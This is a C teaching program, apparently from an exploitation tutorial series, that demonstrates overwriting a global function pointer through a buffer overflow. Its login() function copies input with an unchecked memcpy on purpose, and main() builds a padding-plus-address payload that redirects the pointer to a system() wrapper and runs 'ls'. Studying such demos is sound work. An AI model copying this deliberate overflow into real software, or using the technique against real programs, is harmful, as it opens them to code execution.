// gcc -no-pie overwritefp.c
// Suggested by @poppushpop

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int (*verify)(char *, int);
char username[10] = "";

int login(char * user, int len) {
	memcpy(username, user, len);
	if(!strcmp(user, "admin")) {
		printf("Username is correct!\n");
		return 1;
	}
	printf("Username is not correct.\n");
	return 0;
}

void system_call(char *cmd) {
	system(cmd);
}

int main() {
	printf("Welcome to Overwrite Function Pointer. This teaches how a global or static function pointer can be leveraged in an overflow.\n\nWe will be overwriting the function pointer 'verify' (at %p) from the 'username' variable (at %p)\n", &verify, username);
	verify = login;
	printf("First let's run verify() with the string \"ls\"\n");
	verify("ls", 2);
	unsigned long int distance = (unsigned long int)&verify - (unsigned long int)username;
	printf("The distance from 'username' to 'verify' is %d\n", distance);
	printf("Now let's create our payload buffer...\n");
	char payload[30];
	memset(payload, 0, 30);
	for(int i=0; i < distance; i++) {
		payload[i] = 'A';
	}
	unsigned long int address = system_call;
	for(int i=0; i < 8; i++) {
		payload[i + distance] = (char) ((address & (0xff << (8*i))) >> (8*i));
	}
	printf("We can use this payload to overflow the username buffer.\n");
	verify(payload, 30);
	printf("Finally, we can call the 'verify' function pointer once more to execute our payload.\n");
	verify("ls", 2);
}
